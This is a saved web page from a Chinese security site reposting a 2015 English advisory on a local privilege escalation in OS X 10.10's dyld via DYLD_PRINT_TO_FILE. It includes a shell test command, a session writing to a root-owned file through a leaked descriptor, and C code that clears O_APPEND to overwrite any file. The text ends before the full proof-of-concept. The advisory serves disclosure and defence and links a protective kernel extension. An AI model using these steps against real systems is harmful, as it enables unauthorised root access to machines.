<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns:wb="http://open.weibo.com/wb" xml:lang="en" lang="en">
<head>
    <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
    <meta name="viewport"
          content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no"/>
    <link rel="shortcut icon" href="http://bobao.360.cn/favicon.ico?v=1.1"/>
    <link rel="alternate" title="安全资讯" href="/rss?type=news" type="application/rss+xml"/>
    <link rel="alternate" title="安全知识" href="/rss?type=learning" type="application/rss+xml"/>
    <link rel="alternate" title="安全圈活动" href="/rss?type=activity" type="application/rss+xml"/>
    <link rel="alternate" title="所有漏洞" href="/rss?type=vul" type="application/rss+xml"/>
    <link rel="alternate" title="通用型漏洞" href="/rss?type=commonvul" type="application/rss+xml"/>
    <link rel="alternate" title="事件型漏洞" href="/rss?type=eventvul" type="application/rss+xml"/>
    <link rel="alternate" title="热门漏洞" href="/rss?type=hotvul" type="application/rss+xml"/>

        <title>OS X 10.10 DYLD_PRINT_TO_FILE本地提权漏洞（含EXP） - 安全客 - 有思想的安全新媒体</title>
    
        <meta name="keywords" content="OS X 10.10,DYLD_PRINT_TO_FILE,本地提权漏洞,EXP,Mac提权漏洞"/>
    
        <meta name="description" content="
IntroductionWith the release of OS X 10.10 Apple added some new features to the 
dynamic linker dyld"/>
        <meta property="wb:webmaster" content="224437c7be31d633"/>

    <script type="text/javascript" src="http://s7.qhimg.com/!56caa871/xpc_sync_height.js"></script>
    <link rel="stylesheet" type="text/css" href="/css/reset.css" />
    <link rel="stylesheet" type="text/css" href="/css/common_new.css?v=4.4.2.1" />
    <link rel="stylesheet" type="text/css" href="/css/jquery.notyfy.css" />
    <link rel="stylesheet" type="text/css" href="/css/notyfy.theme.default.css" />
    <link rel="stylesheet" type="text/css" href="/css/s_common.css?v=2.2.7" media="only screen and
    (max-device-width:900px), only screen and (max-width:900px)" />
    <script type="text/javascript" src="/js/jquery.min.js?v=3.1"></script>
    <script type="text/javascript" src="/js/jquery.notyfy.js"></script>
    <script type="text/javascript" src="/js/iscroll.js"></script>
    <script src="http://js.passport.qihucdn.com/5.0.3.js"></script>
    <script type="text/javascript">
        var myScroll, myNavScroll;

        function iscrollLoaded() {
            myScroll = new IScroll('#wrapper',
                {
                    scrollX: true,
                    scrollY: false,
                    bounceEasing: 'circular',
                    eventPassthrough: true,
                    preventDefault: false,
                    bounceTime: 500
                }
            );
        }

        $(function () {

            //导航横向滚动


            function setNavWidth() {

                /* 计算导航宽度 */
                var allWidth = $(window).width();
                var scroller = $('#scroller');

                if (allWidth > 900) {
                    scroller.find('ul').add(scroller.find('.scroll')).removeAttr('style');
                    scroller.css('overflow', 'visible');
                    if (myNavScroll) myNavScroll.destroy();
                } else {

                    var width = 0;
                    scroller.find('.scroll').children('ul').children('li').each(function (index, el) {
                        if (!$(this).hasClass('mobile-hide')) {
                            width += $(this).outerWidth();
                        }
                    });
                    scroller.find('ul').add(scroller.find('.scroll')).width(width);

                    if (myNavScroll) myNavScroll.destroy();

                    myNavScroll = new IScroll('#scroller', {
                        scrollX: true,
                        scrollY: false,
                        momentum: false,
                        click: true
                    });

                }

            }

            setNavWidth();
            $(window).resize(function (event) {
                setNavWidth();
            });

        });

    </script>
</head>
<body onload="iscrollLoaded();">
<div style='margin:0 auto;width:0px;height:0px;overflow:hidden;'>
    <img src=""/>
</div>

<div id="is-mobile"></div>
<div class="container">
        <div class="mobile-header">
        <div class="header clearfix">
            <div class="header-wrapper clearfix">
                <a href="/index/index" class="logo"><img class="slogan" src="/img/logo.png?v=1.5"/></a>
                                <form id="search" class="search-box" action="/search/index" method="GET">
                    <input class="keys" name="keywords" type="text" placeholder="搜索漏洞" required="required">
                    <input class="icon" type="submit" value="">
                    <input type="hidden" name="type" value=""/>
                </form>
                <div class="bug">
                    <div class="name"><span class="seled">全部</span><i class="arrow"></i></div>
                    <ul class="typelist">
                        <li data-index="3"><a href="javascript:void(0);">全部</a></li>
                        <li data-index="0"><a href="javascript:void(0);">漏洞</a></li>
                        <li data-index="1"><a href="javascript:void(0);">资讯</a></li>
                        <li data-index="2"><a href="javascript:void(0);">知识</a></li>
                    </ul>
                </div>
                                <div class="logNreg mobile-hide">
                    <div class="unlog">
                        <i></i>
                        <a href="log.html" class="log">登录</a>
                        <span>|</span>
                        <a href="reg.html" class="reg">注册</a>
                    </div>
                    <div class="loged">
                        <a href="/member/profile" class="user-center"><i></i><span class="user-name-tag">个人中心</span></a>
                        <div class="user-links">
                            <span class="arrow"></span>
                            <ul>
                                <li class="account-setting"><a href="http://i.360.cn/profile/accountmanage"
                                                               target="_blank"><i></i><span>账号设置</span></a></li>
                                <li class="alert-setting"><a href="/keywords/index"
                                                             target="_blank"><i></i><span>告警设置</span></a></li>
                                <li class="bug-alert"><a href="/myalarm/index" target="_blank"><i></i><span>漏洞告警</span></a>
                                </li>
                                <li class="my-knowl"><a href="/mylearn/index" target="_blank"><i></i><span>我的知识</span></a>
                                </li>
                                <li class="my-knowl"><a href="/mycourse/index" target="_blank"><i></i><span>我的课堂</span></a>
                                </li>
                                <li class="my-exit"><a
                                            href="http://login.360.cn/?src=pcw_adlab&op=logout&destUrl=http://bobao.360.cn"><i></i><span>退出系统</span></a>
                                </li>
                            </ul>
                        </div>

                        <a href="/message" class="message-center" target="_blank"><i></i><span>我的消息</span></a>
                        <div class="message-links">
                            <span class="arrow"></span>
                            <ul>
                                <li class="account-setting" style="display:none;"><a href="/myres/index"
                                                                                     target="_blank"><i></i><span>回复我的</span></a>
                                </li>
                                <li class="my-bug"><a href="/myvul/index"
                                                      target="_blank"><i></i><span>我的漏洞</span></a></li>
                                <!--<li class="my-bug"><a href="/myres/index" target="_blank"><i></i><span>我的评论</span></a></li>-->
                                <!--<li class="alert-setting"><a href="###" target="_blank"><i></i><span>提到我的</span></a>
                                </li>-->
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <style type="text/css">
            .nav {
                overflow: hidden;
            }

            .nav .scroll {
                width: auto;
            }
        </style>
        <div id="wrapper">
            <div id="scroller" class="nav">
                <div class="scroll">
                    <ul class="nav-list">
                        <li ><a class="link-nav"
                                                                                 href="/index/index">首页</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/vul/index">漏洞</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/introduce/list">招聘</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/news/index">资讯</a><!--<i class="arrow mobile-hide"></i>
                        <ul class="subnav-list mobile-hide">
                            <li><a class="link-subnav" href="/introduce/list">招聘</a></li>
                        </ul>
			-->
                        </li>
                        <li class="cur">
                        <a class="link-nav" href="/learning/index">知识</a><i class="arrow mobile-hide"></i>
                        <ul class="subnav-list mobile-hide">
                            <li><a class="link-subnav" href="/course/index">学院</a></li>
                        </ul>
                        </li>
                        <li ><a class="link-nav"
                                                               href="/activity/index">活动</a></li>
                        <li class="mobile-hide "><a class="link-nav"
                                                                                                   href="/ctf/index">CTF训练营</a>
                        </li>
                        <li ><a class="link-nav"
                                                               href="/interref/list">安全内参</a></li>
                        <li ><a class="link-nav" href="/app/index">APP</a></li>

                        <!--<li ><a href="/course/index">学院</a></li>-->
                        <!--<li ><a href="/introduce/list">招聘</a></li>-->
                        <!--<li  class="mobile-hide"><a href="/ctf/index">CTF训练营</a></li>-->
                    </ul>
                </div>
            </div>
        </div>
    </div>
    
    <div class="mobile-content">
        <link rel="stylesheet" type="text/css" href="/css/news.css?v=3.5" />
<link rel="stylesheet" type="text/css" href="/ue/SyntaxHighlighter/shCoreDefault.css?v=1.0" />
<style>
    p .syntaxhighlighter {
        width: 80%;
    }
</style>

<div class="cur-pos w1000">当前位置：<a href="http://bobao.360.cn/">安全客</a> &gt;&gt; 知识详情</div>

<div class="content clearfix">
    <div class="main">
        <div class="article">
            <div id="article_box">
                <h2>OS X 10.10 DYLD_PRINT_TO_FILE本地提权漏洞（含EXP）</h2>
                <div class="article-msg">
                    <span class="time">2015-07-22 10:19:42</span>
                                        <span class="read">阅读：10393次</span>
                    <span><a style="display: none;" class="good" href="javascript:;"
                             data-target="/learning/good" data-value="g_543"
                             data-type="learning">点赞(0)</a></span>
                    <span><a class="fav" href="javascript:;" data-target="/mylearning/add"
                             data-pk="543" data-type="learning">收藏</a></span>
                    
                                    </div>
                <hr size="1">
                <div class="article-msg">
                    <p><!-- JiaThis Button BEGIN -->

<!--
<span class="jiathis_style"><span class="jiathis_txt">分享到：</span>
	<a class="jiathis_button_weixin"></a>
	<a class="jiathis_button_tsina"></a>
    <a class="jiathis_button_tqq"></a>
    <a class="jiathis_button_qzone"></a>
    <a class="jiathis_button_renren"></a>
    <a class="jiathis_button_xiaoyou"></a>
    <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
</span>

-->
</p>
                </div>
                <p><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">应广大网友要求，近期我们会发布一些未经过编辑的英文原文，看看大家的喜好程度和阅读能力哈。下图为在最新版本Mac OsX 10.10.4中测试提权成功截图</span><br/></p><p style="text-align: center;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;"><img alt="http://p5.qhimg.com/t0198c40d61a9644305.jpg" src="http://p3.qhimg.com/t0131584a49ecab1bf2.jpg" title="t0198c40d61a9644305.jpg"/></span><img src="http://p9.qhimg.com/t0128409224efbe66b1.png" title="t0128409224efbe66b1.png" alt="http://p7.qhimg.com/t0128409224efbe66b1.png" style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;"/></p><p style="text-align: center;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;"></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">Introduction</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">With the release of OS X 10.10 Apple added some new features to the 
dynamic linker dyld. One of these features is the new environment 
variable <strong>DYLD_PRINT_TO_FILE</strong> that enables error logging to an arbitrary file.</span></p><blockquote style="text-indent: 2em; text-align: left;"><ul class=" list-paddingleft-2" style="list-style-type: disc;"><li><p style="text-indent: 0em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">DYLD_PRINT_TO_FILE</span></p></li><li><p style="text-indent: 0em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">This &nbsp;is &nbsp;a &nbsp;path &nbsp;to &nbsp;a &nbsp;(writable) file. Normally, the dynamic linker writes all logging output (triggered by
DYLD_PRINT_* settings) to file descriptor 2 (which is usually stderr). &nbsp;But this &nbsp;setting &nbsp;causes &nbsp;the &nbsp;dynamic
linker to write logging output to the specified file.</span></p></li></ul></blockquote><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">When this variable was added the usual safeguards that are required 
when adding support for new environment variables to the dynamic linker 
have not been used. Therefore it is possible to use this new feature 
even with SUID root binaries. This is dangerous, because it allows to 
open or create arbitrary files owned by the root user anywhere in the 
file system. Furthermore the opened log file is never closed and 
therefore its file descriptor is leaked into processes spawned by SUID 
binaries. This means child processes of SUID root processes can write to
 arbitrary files owned by the root user anywhere in the filesystem. This
 allows for easy privilege escalation in OS X 10.10.x.</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">At the moment it is unclear if Apple knows about this security 
problem or not, because while it is already fixed in the first betas of 
OS X 10.11, it is left unpatched in the current release of OS X 10.10.4 
or in the current beta of OS X 10.10.5.</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">Nevertheless we have released the source code of a kernel extension 
and a digitally signed version of it that protects users of OS X 10.10.x
 from this vulnerability. You can download it from GitHub </span><a style="text-decoration: underline; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;" href="https://github.com/sektioneins/SUIDGuard"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">https://github.com/sektioneins/SUIDGuard</span></a><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">.</span></p><p style="text-align: center;"><img alt="/images/iosobfuscation.jpg" id="imgtc" src="http://p4.qhimg.com/t012ca5a24b39ec7322.jpg"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">The Vulnerability</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">When Apple changed the dynamic linker code for OS X 10.10 to support the new <strong>DYLD_PRINT_TO_FILE</strong> environment variable they added the following code directly to the <strong>_main</strong>
 function of dyld. As you can see from this code the value of the 
environment variable is directly used as filename for the opened or 
created logging file.</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;"></span></p><pre class="brush:cpp;toolbar:false">const&nbsp;char*&nbsp;loggingPath&nbsp;=&nbsp;_simple_getenv(envp,&nbsp;&quot;DYLD_PRINT_TO_FILE&quot;);
if&nbsp;(&nbsp;loggingPath&nbsp;!=&nbsp;NULL&nbsp;)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;int&nbsp;fd&nbsp;=&nbsp;open(loggingPath,&nbsp;O_WRONLY&nbsp;|&nbsp;O_CREAT&nbsp;|&nbsp;O_APPEND,&nbsp;0644);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;fd&nbsp;!=&nbsp;-1&nbsp;)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sLogfile&nbsp;=&nbsp;fd;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sLogToFile&nbsp;=&nbsp;true;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dyld::log(&quot;dyld:&nbsp;could&nbsp;not&nbsp;open&nbsp;DYLD_PRINT_TO_FILE=&#39;%s&#39;,&nbsp;errno=%d\n&quot;,&nbsp;loggingPath,&nbsp;errno);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
}</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px; text-indent: 2em;">The problem with this code is that it does not come with any 
safeguards that are required when adding new environment variables to 
the dynamic linker. Normally for security reasons the dynamic linker 
should reject all environvent variables passed to it in case of 
restricted files. This is automatically handled when new environment 
variables are added to the </span><strong style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px; text-indent: 2em;">processDyldEnvironmentVariable()</strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px; text-indent: 2em;"> function. However in the </span><strong style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px; text-indent: 2em;">DYLD_PRINT_TO_FILE</strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px; text-indent: 2em;"> case the code was directly added to the </span><strong style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px; text-indent: 2em;">_main</strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px; text-indent: 2em;"> function of dyld.</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">Because of this oversight dyld will accept <strong>DYLD_PRINT_TO_FILE</strong>
 even for restricted binaries, like SUID root binaries. This is 
obviously a problem, because it allows the creation or opening (for 
writing) of any file in the filesystem. And because the log file is 
never closed by dyld and the file is not openes with the close on exec 
flag the opened file descriptor is inherited by child processes of SUID 
binaries. This can be easily exploited for privilege escalation.</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">Apple has fixed this vulnerability in the OS X 10.11 beta by moving the code for the <strong>DYLD_PRINT_TO_FILE</strong> (and another new environment variable) to the <strong>processDyldEnvironmentVariable()</strong>
 function, which automatically protects them. This might however be the 
result of a code cleanup and not based on realizing the security 
implications. However if this is the result of a security fix then Apple
 has once again shown how unsupported their current versions become the 
moment a new beta is in development.</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">Testing</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">Testing if your system is vulnerable to this attack or not is quite 
easy and can be done directly from the commandline. Just enter the 
following into a shell:</span></p><pre class="brush:bash;toolbar:false;">$&nbsp;EDITOR=/usr/bin/true&nbsp;DYLD_PRINT_TO_FILE=/this_system_is_vulnerable&nbsp;crontab&nbsp;-e</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px; text-indent: 2em;">Afterward the root directory of your filesystem should show the created file with root permissions.</span><br/></p><p style="text-indent: 2em; text-align: left;"><br/></p><pre class="brush:bash;toolbar:false">$&nbsp;ls&nbsp;-la&nbsp;/
total&nbsp;317
...
drwxr-xr-x@&nbsp;&nbsp;2&nbsp;root&nbsp;&nbsp;wheel&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;68&nbsp;Sep&nbsp;&nbsp;9&nbsp;&nbsp;2014&nbsp;Network
drwxr-xr-x+&nbsp;&nbsp;4&nbsp;root&nbsp;&nbsp;wheel&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;136&nbsp;Jul&nbsp;15&nbsp;16:03&nbsp;System
drwxr-xr-x&nbsp;&nbsp;&nbsp;6&nbsp;root&nbsp;&nbsp;admin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;204&nbsp;Jul&nbsp;17&nbsp;17:39&nbsp;Users
drwxrwxrwt@&nbsp;&nbsp;4&nbsp;root&nbsp;&nbsp;admin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;136&nbsp;Jul&nbsp;21&nbsp;07:28&nbsp;Volumes
drwxr-xr-x@&nbsp;39&nbsp;root&nbsp;&nbsp;wheel&nbsp;&nbsp;&nbsp;&nbsp;1326&nbsp;Jul&nbsp;20&nbsp;19:26&nbsp;bin
drwxrwxr-t@&nbsp;&nbsp;2&nbsp;root&nbsp;&nbsp;admin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;68&nbsp;Sep&nbsp;&nbsp;9&nbsp;&nbsp;2014&nbsp;cores
dr-xr-xr-x&nbsp;&nbsp;&nbsp;3&nbsp;root&nbsp;&nbsp;wheel&nbsp;&nbsp;&nbsp;&nbsp;4156&nbsp;Jul&nbsp;20&nbsp;20:26&nbsp;dev
lrwxr-xr-x@&nbsp;&nbsp;1&nbsp;root&nbsp;&nbsp;wheel&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;11&nbsp;Jul&nbsp;15&nbsp;15:55&nbsp;etc&nbsp;-&gt;&nbsp;private/etc
dr-xr-xr-x&nbsp;&nbsp;&nbsp;2&nbsp;root&nbsp;&nbsp;wheel&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1&nbsp;Jul&nbsp;21&nbsp;07:34&nbsp;home
-rw-r--r--@&nbsp;&nbsp;1&nbsp;root&nbsp;&nbsp;wheel&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;313&nbsp;Apr&nbsp;28&nbsp;21:11&nbsp;installer.failurerequests
dr-xr-xr-x&nbsp;&nbsp;&nbsp;2&nbsp;root&nbsp;&nbsp;wheel&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1&nbsp;Jul&nbsp;21&nbsp;07:34&nbsp;net
drwxr-xr-x@&nbsp;&nbsp;6&nbsp;root&nbsp;&nbsp;wheel&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;204&nbsp;Jul&nbsp;15&nbsp;16:08&nbsp;private
drwxr-xr-x@&nbsp;61&nbsp;root&nbsp;&nbsp;wheel&nbsp;&nbsp;&nbsp;&nbsp;2074&nbsp;Jul&nbsp;20&nbsp;19:26&nbsp;sbin
-rw-r--r--&nbsp;&nbsp;&nbsp;1&nbsp;root&nbsp;&nbsp;wheel&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;Jul&nbsp;21&nbsp;17:22&nbsp;this_system_is_vulnerabl</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px; text-indent: 2em;">If you can see this file then you are vulnerable to this problem.</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">Protection</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">Before going into the exploitation of this problem please be reminded
 that because it will likely take months for Apple to react to this 
issue we released a kernel extension that protects from this 
vulnerability by stopping all <strong>DYLD_</strong> environment 
variables form being recognized by the dynamic linker for SUID root 
binaries. In addition to that it adds a mitigation against a common 
trick to circumvent <strong>O_APPEND</strong> restrictions on file descriptors.</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">You can get the source code and a digitally signed copy of the KEXT on GitHub:</span></p><p style="text-indent: 2em; text-align: left;"><a style="text-decoration: underline; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;" href="https://github.com/sektioneins/SUIDGuard"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">https://github.com/sektioneins/SUIDGuard</span></a></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">Exploitation 1</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">After having established that you are vulnerable to the bug in 
question you might wonder how this can lead to a full privilege 
escalation exploit. While there might be a way to escalate privileges by
 just creating an empty file in some place our bug in question allows 
for more control, because it leaks the opened file descriptor to child 
processes of the SUID binaries that we execute. We can demonstrate this 
again with a few simple shell command lines.</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;"></span></p><pre class="brush:bash;toolbar:false">$&nbsp;&nbsp;DYLD_PRINT_TO_FILE=/this_system_is_vulnerable&nbsp;su&nbsp;&lt;some_username&gt;
Password:
bash-3.2$&nbsp;ls&nbsp;-la&nbsp;/this_system_is_vulnerable
-rw-r--r--&nbsp;&nbsp;1&nbsp;root&nbsp;&nbsp;wheel&nbsp;&nbsp;0&nbsp;Jul&nbsp;21&nbsp;17:22&nbsp;/this_system_is_vulnerable
bash-3.2$&nbsp;echo&nbsp;&quot;Test&nbsp;1&quot;&nbsp;&gt;&amp;3
bash-3.2$&nbsp;echo&nbsp;&quot;Test&nbsp;2&quot;&nbsp;&gt;&amp;3
bash-3.2$&nbsp;cat&nbsp;/this_system_is_vulnerable
Test&nbsp;1
Test&nbsp;2
bash-3.2$&nbsp;ls&nbsp;-la&nbsp;/this_system_is_vulnerable
-rw-r--r--&nbsp;&nbsp;1&nbsp;root&nbsp;&nbsp;wheel&nbsp;&nbsp;14&nbsp;Jul&nbsp;21&nbsp;17:36&nbsp;/this_system_is_vulnerable</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px; text-indent: 2em;">As you can see the file descriptor 3 that is bound to the opened log 
file is leaked to the spawned shell and can be directly written to. As 
you can see an unprivileged user has just appended data to a root owned 
file. This could be any file on the filesystem which makes privilege 
escalation quite easy.</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">NOTE: in this example we used <strong>su</strong> which required entering our own password, but we could use the same <strong>crontab</strong> trick as before and just put a malicious shell script doing the same into the <strong>EDITOR</strong> environment variable.</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">Exploitation 2</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">So far we have demonstrated that we can append arbitrary data to the 
end of any file on the filesystem. This is already bad enough, but so 
far we have been limited by the &nbsp;<strong>O_APPEND</strong> flag that 
stopped us from just overwriting a file with whatever we want. This is 
however a smaller problem than most people believe, because the <strong>O_APPEND</strong> flag on file descriptors can be disabled by anyone who has control over the file descriptor with a simple call of the <strong>fcntl(F_SETFL)</strong> system call. The following example C code shows how this allows writing anything into any file.</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;"></span></p><p><br/></p><pre class="brush:cpp;toolbar:false">int&nbsp;main(int&nbsp;argc,&nbsp;char&nbsp;**argv)
{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;int&nbsp;fd;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;char&nbsp;buffer[1024];
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/*&nbsp;disable&nbsp;O_APPEND&nbsp;*/
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fcntl(3,&nbsp;F_SETFL,&nbsp;0);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;lseek(3,&nbsp;0,&nbsp;SEEK_SET);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;strcpy(buffer,&nbsp;&quot;anything&nbsp;-&nbsp;anything&nbsp;-&nbsp;anything&quot;);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;write(3,&nbsp;&amp;buffer,&nbsp;strlen(buffer));</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px; text-indent: 2em;">When you use the code above e.g. as EDITOR for crontab then this allows you to overwrite any file with anything.</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">Exploitation 3</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">When you can write anything to any file on the filesystem the first 
idea will obviously be to overwrite another SUID root binary with your 
own code to create yourself a root shell. The only problem you might be 
aware of is some information you will find in the manpage of the write 
system call in OS X.</span></p><blockquote style="text-indent: 2em; text-align: left;"><ul class=" list-paddingleft-2" style="list-style-type: disc;"><li><p dir="ltr" style="text-indent: 0em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">write(2) manpage</span></p></li><li><p dir="ltr" style="text-indent: 0em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">If the real user is not the super-user, then write() clears the set-user-id bit on a file. This prevents penetration
of system security by a user who &#39;&#39;captures&#39;&#39; a writable set-user-id file owned by the super-user.</span></p></li></ul></blockquote><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">This excerpt from the manpage if write(2) makes it sound like you 
cannot use this attack to overwrite SUID root binaries. But you should 
never believe manpages, because when you try it you will realize that 
you can overwrite arbitrary SUID root binaries on your filesystem with 
this attack. The mitigation Apple has in the kernel does not trigger in 
our case, because the logging file is opened by the SUID root binary and
 therefore the assigned file credentials are those of the SUID root 
binary. Therefore the write to the filesystem will believe the write is 
executed by the super-user and therefore the SUID bit is not cleared.</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">As a proof that this is indeed possible please find the full POC 
exploit attached at the end of a post just after a little advertisement 
for our upcoming FALL OS X and iOS training courses.</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">Training Advertisement</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">Before I share a working POC exploit for this problem with you, let 
me finish this post by highlighting that SektionEins is organizing 
